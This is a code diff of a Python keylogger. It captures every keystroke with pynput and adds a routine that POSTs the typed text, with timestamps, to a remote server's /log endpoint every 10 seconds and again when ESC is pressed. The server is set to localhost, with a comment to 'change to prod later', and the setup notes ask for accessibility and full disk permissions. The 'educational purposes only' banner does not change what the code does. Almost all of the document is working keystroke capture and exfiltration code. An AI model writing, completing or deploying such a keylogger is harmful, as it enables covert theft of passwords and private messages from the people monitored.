@@ -1,20 +1,47 @@
 from pynput import keyboard
-from datetime import datetime
 import requests
-import json
 import threading
-import time
+from datetime import datetime
 
 # OBS: allow IDE Input Monitoring, Accessibility, Full Disk Access in OS settings
 
-class KeyLogger:
+class SimpleKeyLogger:
     def __init__(self, server_url):
         self.server_url = server_url
         self.text = ""
-        self.time_interval = 10 # Send to sever every 10 seconds
+        self.time_interval = 10  # Send every 10 seconds
 
-    # def send_to_server(self):
+    """Send the captured text to server"""
+    def send_to_server(self):
+        if self.text.strip():  # Only send if there's actual text
+            try:
+                payload = {
+                    "keyboard_data": self.text,
+                    "timestamp": datetime.now().isoformat()
+                }
 
+                response = requests.post(
+                    f"{self.server_url}/log",
+                    json=payload,
+                    headers={"Content-Type": "application/json"},
+                    timeout=10
+                )
+
+                if response.status_code == 200:
+                    print(f"Sent {len(self.text)} characters to server")
+                    self.text = ""  # Clear after successful send
+                else:
+                    print(f"Server error: {response.status_code}")
+
+            except Exception as e:
+                print(f"Could not send data: {e}")
+
+        # Schedule next send
+        timer = threading.Timer(self.time_interval, self.send_to_server)
+        timer.daemon = True
+        timer.start()
+
+    """Handle key press events"""
     def on_press(self, key):
         try:
             if key == keyboard.Key.enter:
@@ -25,38 +52,38 @@ class KeyLogger:
                 self.text += " "
             elif key == keyboard.Key.backspace and len(self.text) > 0:
                 self.text = self.text[:-1]
-            elif key == keyboard.Key.shift:
-                pass
-            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                 pass
             elif key == keyboard.Key.esc:
                 print("\nStopping keylogger...")
-                '''
-                # Send any remaining text before stopping
                 if self.text:
-                    self.send_to_server()
+                    self.send_to_server() # Send any remaining text before stopping
                 return False
-                '''
             else:
                 self.text += str(key).strip("'")
 
-            # printing for testing
+            # Show real-time preview (last 50 characters)
             preview = self.text[-50:]
             print(f"\rTyping: {preview}", end="", flush=True)
 
         except AttributeError:
             print(f'\n[Special key {key} pressed]')
 
+    """Start the keylogger"""
     def start(self):
+        print("SIMPLE KEYLOGGER - FOR EDUCATIONAL PURPOSES ONLY")
+        print(f"\nKeylogger started. Sending to: {self.server_url}")
+        print("Type anything... Press ESC to stop.")
+        print("Text will be sent to server every 10 seconds.")
+        print("-" * 50)
 
-        # Start listening to keyboard
+        self.send_to_server() # Start the periodic sending
+
         with keyboard.Listener(on_press=self.on_press) as listener:
-            listener.join()
+            listener.join() # Start listening to keyboard
 
-
-# For local testing
 if __name__ == "__main__":
-    SERVER_URL = "http://127.0.0.1:5000"  # For local testing
+    SERVER_URL = "http://127.0.0.1:5000"  # For local testing, change to prod later
 
-    logger = KeyLogger(SERVER_URL)
+    logger = SimpleKeyLogger(SERVER_URL)
     logger.start()
